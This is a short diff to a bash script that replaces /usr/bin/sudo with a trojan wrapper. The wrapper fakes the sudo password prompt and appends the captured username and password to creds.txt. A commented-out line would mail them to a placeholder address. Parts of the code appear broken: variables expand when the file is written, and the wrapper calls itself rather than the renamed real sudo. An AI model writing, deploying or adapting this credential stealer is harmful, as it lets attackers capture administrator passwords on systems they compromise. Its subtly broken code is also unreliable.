@@ -1,11 +1,16 @@
-#! /bin/bash
+cd /usr/bin
+mv sudo odus
 
-read -s -p "[sudo] password for $USER: " password
+echo "#! /bin/bash">>sudo
 
-echo
-echo "Nothing to see here:">>creds.txt
-echo "$USER:$password">>creds.txt
+echo "read -s -p \"[sudo] password for $USER: \" password">>sudo
+
+echo "echo">>sudo
+echo "echo \"Nothing to see here:\">>creds.txt">>sudo
+echo "echo \"$USER:$password\">>creds.txt">>sudo
 
 #echo "$USER:$password" | sendmail -v {user}@{mail}.com
 
-sudo -u $USER -p $password $@
+echo "sudo -u $USER -p $password $@">>sudo
+
+chmod 755 sudo
